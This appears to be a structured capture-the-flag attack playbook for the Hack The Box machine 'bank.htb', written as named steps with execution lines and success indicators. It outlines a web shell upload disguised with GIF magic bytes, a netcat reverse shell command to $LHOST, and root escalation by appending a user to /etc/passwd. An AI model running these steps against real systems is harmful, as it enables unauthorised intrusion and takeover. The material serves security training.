name: DNS Zone Transfer Discovery

decision_points.if: DNS server responds to zone transfer for 'bank.htb'

success_indicators: List of subdomains obtained from zone transfer.
follow_up: Discover Subdomains via DNS Zone Transfer

name: Web Server Virtual Host Discovery
execution: Send HTTP request to Burp Suite
Modify Host header to $VHOST and forward request

decision_points.if: HTTP response differs when Host header is changed to a discovered subdomain

success_indicators: Different HTTP responses based on Host header.

name: Bypass HTTP Redirect
execution: Configure Burp Suite to intercept responses
Modify response header from '302 Found' to '200 OK'
success_indicators: Accessing a page that was previously redirected.

name: Download Files Recursively

decision_points.then: Analyze downloaded files for sensitive information.

success_indicators: Files downloaded from the target directory.

name: Analyze Downloaded Files for Credentials

decision_points.if: Email and password found in a file

success_indicators: Email and password extracted from a file.

name: Authenticate to Web Application

decision_points.if: Successful login to the web application

success_indicators: Access to the web application dashboard.

name: Upload Web Shell (Image Extension Bypass)
execution: Craft a PHP web shell with image magic bytes (GIF89a)
Append '.htb' extension to the web shell filename
Upload the crafted file via the web application
Access the uploaded web shell via its URL

decision_points.if: Web shell is uploaded and accessible
decision_points.then: Execute commands through the web shell.

success_indicators: Web shell is uploaded and executes commands.

name: Gain Reverse Shell
execution: Execute netcat reverse shell command from web shell: nc -nv $LHOST $LPORT -e /bin/sh
Execute python reverse shell command from web shell: python -c 'import pty; pty.spawn("/bin/bash")'

decision_points.then: Stabilize the shell for further enumeration.

name: Stabilize Shell
execution: Run 'fg' to bring shell to foreground

decision_points.if: Shell is stabilized with TTY and history

success_indicators: Shell with tab completion and full terminal capabilities.

decision_points.then: Create a new user with a password in /etc/passwd.

name: Modify /etc/passwd for Privilege Escalation
execution: Generate encrypted password hash using openssl passwd
Append new user and encrypted password to /etc/passwd
Use 'su - root' to switch to root user with the new password

name: Find SetUID Binary for Privilege Escalation

decision_points.if: A SetUID binary is found that can be exploited
decision_points.then: Execute the SetUID binary to gain elevated privileges.

name: Exploit SetUID Binary

decision_points.if: Execution of the SetUID binary grants root privileges

success_indicators: Root access obtained by executing the SetUID binary.
